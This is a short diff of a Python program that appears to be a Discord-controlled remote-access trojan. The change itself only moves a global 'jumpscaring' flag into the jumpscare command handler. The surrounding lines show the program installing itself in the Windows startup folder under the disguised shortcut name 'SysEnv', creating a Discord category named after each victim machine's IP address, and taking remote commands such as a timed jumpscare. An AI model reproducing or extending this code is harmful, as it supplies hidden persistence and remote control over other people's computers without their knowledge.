@@ -48,6 +48,7 @@ shortcut_path = startup_dir / f"{shortcut_name}.lnk"
 
 
 CHANNEL_ID = 1355560563622678699
+jumpscaring = False
 
 def add_to_startup(script_path=os.path.join(target_path, 'skibidi-startup', 'startup.pyw'), shortcut_name="SysEnv"):
 
@@ -265,8 +266,6 @@ async def on_ready():
     global_update_channel_id = 1337769661466415136
     channel12 = client.get_channel(global_online_channel_id)
     channel13 = client.get_channel(global_update_channel_id)
-    global jumpscaring
-    jumpscaring = False
     for guild in client.guilds:
         existing_category = nextcord.utils.get(guild.categories, name=str(ip))
         
@@ -750,6 +749,7 @@ async def jumpscare(interaction: nextcord.Interaction):
             return
         print("Jumpscare command received")
         print("Activating jumpscare...")
+        global jumpscaring
         jumpscaring = True
         n = 10
         await interaction.response.send_message(f"Starting {n} second jumpscare countdown...")
